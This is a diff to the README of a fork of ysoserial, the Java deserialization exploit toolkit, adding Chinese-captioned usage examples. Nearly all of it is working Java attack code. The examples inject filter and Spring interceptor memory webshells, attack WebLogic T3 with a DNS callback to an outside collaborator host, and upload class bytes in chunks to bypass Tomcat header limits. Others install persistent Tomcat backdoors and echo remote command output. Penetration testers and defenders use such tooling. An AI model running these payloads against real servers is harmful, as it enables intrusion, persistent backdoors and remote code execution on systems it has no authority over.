@@ -26,6 +26,268 @@
 
 2022.4.22 RCE 回显，shiro550，RequestHttp工具类，CB no CC
 
+
+
+## exploit
+
+> 对增加的一些 features 的用法，做简单的展示
+
+### 注入内存马：
+
+filter 内存马：
+
+```java
+package top.inhann;
+
+import ysoserial.Serializer;
+import ysoserial.payloads.CommonsCollections10;
+import ysoserial.payloads.memshell.FilterShell2;
+import ysoserial.payloads.util.HttpRequest;
+
+public class Test {
+
+    public static void main(String[] args) throws Exception{
+        String url = "http://127.0.0.1:8080/bitch";
+        Object o = new FilterShell2().getObject(CommonsCollections10.class);
+        byte[] ser = Serializer.serialize(o);
+        byte[] resp = new HttpRequest(url).addPostData(ser).send();
+        System.out.println(new String(resp));
+    }
+}
+```
+
+springboot interceptor 内存马：
+
+```java
+package top.inhann;
+
+import ysoserial.Serializer;
+import ysoserial.payloads.CommonsCollections10;
+import ysoserial.payloads.memshell.SpringInterceptorShell;
+import ysoserial.payloads.util.HttpRequest;
+
+public class Test {
+
+    public static void main(String[] args) throws Exception{
+        String url = "http://127.0.0.1:8080/bitch";
+        Object o = new SpringInterceptorShell().getObject(CommonsCollections10.class);
+        byte[] ser = Serializer.serialize(o);
+        byte[] resp = new HttpRequest(url).addPostData(ser).send();
+        System.out.println(new String(resp));
+    }
+}
+```
+
+### 攻击 T3：
+
+```java
+package top.inhann;
+
+import ysoserial.payloads.T3;
+import ysoserial.payloads.URLDNS;
+import ysoserial.payloads.util.SocketClient;
+
+public class Test {
+    public static void main(String[] args) throws Exception{
+        SocketClient s = SocketClient.remote("wsl.com",7001);
+
+        Object evil = new URLDNS().getObject("http://6biqhbd2azsc3wq9wv5uqqrep5vwjl.burpcollaborator.net");
+        byte[] handshake = new T3().handShake();
+        byte[] payload = new T3().getPayload(evil);
+
+        s.send(handshake);
+        s.recvline();
+        s.send(payload);
+        s.close();
+    }
+}
+```
+
+### 解决 tomcat 的 header 过大问题
+
+分离 payload ，body 存储，动态加载：
+
+```java
+package top.inhann;
+
+import ysoserial.Serializer;
+import ysoserial.payloads.CommonsCollections10;
+import ysoserial.payloads.headertoolarge.TomcatHeaderTooLarge;
+import ysoserial.payloads.util.Encoder;
+import ysoserial.payloads.util.HttpRequest;
+import ysoserial.payloads.util.JavaCompiler;
+import ysoserial.payloads.util.ReadWrite;
+
+import java.util.Base64;
+
+public class Test {
+
+    public static void main(String[] args) throws Exception{
+        String url = "http://127.0.0.1:8081/bitch";
+
+        String java = new String(ReadWrite.readResource(Test.class,"内存马/filter/FilterShell2.java"));
+        byte[] b = JavaCompiler.compile("FilterShell2",java);
+        String b64 = Encoder.base64_encode(b);
+
+        Object o = new TomcatHeaderTooLarge().loadClassFromBody(CommonsCollections10.class,"FilterShell2");
+        byte[] ser = Serializer.serialize(o);
+        new HttpRequest(url).addHeader("data", Base64.getEncoder().encodeToString(ser)).addPostData("b64_class_bytes",b64).send();
+    }
+}
+```
+
+分离 payload ，落地存储，动态加载：
+
+```java
+package top.inhann;
+
+import ysoserial.Serializer;
+import ysoserial.payloads.CommonsCollections10;
+import ysoserial.payloads.Eval;
+import ysoserial.payloads.util.HttpRequest;
+import ysoserial.payloads.util.JavaCompiler;
+import ysoserial.payloads.util.ReadWrite;
+
+import java.util.Arrays;
+import java.util.Base64;
+
+public class Test {
+
+    public static void main(String[] args) throws Exception{
+        String url = "http://127.0.0.1:8081/bitch";
+        String classPath = "/tmp/1nhann.txt";
+        String className = "FilterShell2";
+
+        String java = new String(ReadWrite.readResource(Test.class,"内存马/filter/FilterShell2.java"));
+        byte[] b = JavaCompiler.compile("FilterShell2",java);
+
+
+        System.out.println(b.length);
+        int i = 0;
+        boolean flag = true;
+        int l = 1000;
+        while (flag){
+            byte[] slice = null;
+            if(i+l < b.length){
+                slice = Arrays.copyOfRange(b, i, i+l);
+                i += l;
+            }else {
+                slice = Arrays.copyOfRange(b, i, b.length);
+                flag = false;
+            }
+            Object o = new Eval().uploadFile(CommonsCollections10.class,slice,classPath,i > l);
+            byte[] ser = Serializer.serialize(o);
+            new HttpRequest(url).addHeader("data", Base64.getEncoder().encodeToString(ser)).send();
+        }
+        Object o = new Eval().loadClass(CommonsCollections10.class,classPath,className);
+        byte[] ser = Serializer.serialize(o);
+        new HttpRequest(url).addHeader("data", Base64.getEncoder().encodeToString(ser)).send();
+
+        o = new Eval().deleteFile(CommonsCollections10.class,classPath);
+        ser = Serializer.serialize(o);
+        new HttpRequest(url).addHeader("data", Base64.getEncoder().encodeToString(ser)).send();
+    }
+}
+```
+
+### tomcat 持久化后门：
+
+劫持 `ApplicationFilterChain` 的 `doFilter()` ：
+
+```java
+package top.inhann;
+
+import ysoserial.Serializer;
+import ysoserial.payloads.CommonsCollections10;
+import ysoserial.payloads.persist.ApplicationFilterChain_doFilter;
+import ysoserial.payloads.util.HttpRequest;
+
+public class Test {
+
+    public static void main(String[] args) throws Exception{
+        String url = "http://127.0.0.1:8081/bitch";
+        Object o = new ApplicationFilterChain_doFilter().getObject(CommonsCollections10.class,"/usr/local/tomcat");
+        byte[] ser = Serializer.serialize(o);
+        new HttpRequest(url).addPostData(ser).send();
+    }
+}
+```
+
+利用 `ServletContainerInitializer` ：
+
+```java
+package top.inhann;
+
+import ysoserial.Serializer;
+import ysoserial.payloads.CommonsCollections10;
+import ysoserial.payloads.persist.EvilInitializer;
+import ysoserial.payloads.util.HttpRequest;
+
+public class Test {
+
+    public static void main(String[] args) throws Exception{
+        String url = "http://wsl.com:8081/bitch";
+        Object o = new EvilInitializer().getObject(CommonsCollections10.class,"/usr/local/tomcat/webapps/ROOT");
+        byte[] ser = Serializer.serialize(o);
+        new HttpRequest(url).addPostData(ser).send();
+    }
+}
+```
+
+
+
+### RCE 回显：
+
+linux 通杀回显：
+
+```java
+package top.inhann;
+
+import ysoserial.Serializer;
+import ysoserial.payloads.CommonsCollections10;
+import ysoserial.payloads.rceecho.LinuxEcho;
+import ysoserial.payloads.util.HttpRequest;
+
+public class Test {
+
+    public static void main(String[] args) throws Exception{
+        String url = "http://127.0.0.1:8081/bitch";
+        Object o = new LinuxEcho().getObject(CommonsCollections10.class);
+        byte[] ser = Serializer.serialize(o);
+        byte[] resp =  new HttpRequest(url).addPostData(ser).send();
+        System.out.println(new String(resp));
+    }
+}
+
+```
+
+tomcat 回显：
+
+```java
+package top.inhann;
+
+import ysoserial.Serializer;
+import ysoserial.payloads.CommonsCollections10;
+import ysoserial.payloads.rceecho.TomcatEcho3;
+import ysoserial.payloads.util.HttpRequest;
+
+public class Test {
+
+    public static void main(String[] args) throws Exception{
+        String url = "http://wsl.com:8081/bitch";
+        Object o = new TomcatEcho3().getObject(CommonsCollections10.class);
+        byte[] ser = Serializer.serialize(o);
+        byte[] resp =  new HttpRequest(url).addPostData(ser).addHeader("cmd","id").send();
+        System.out.println(new String(resp));
+    }
+}
+
+```
+
+
+
+
+
 # ysoserial
 
 [![Join the chat at https://gitter.im/frohoff/ysoserial](
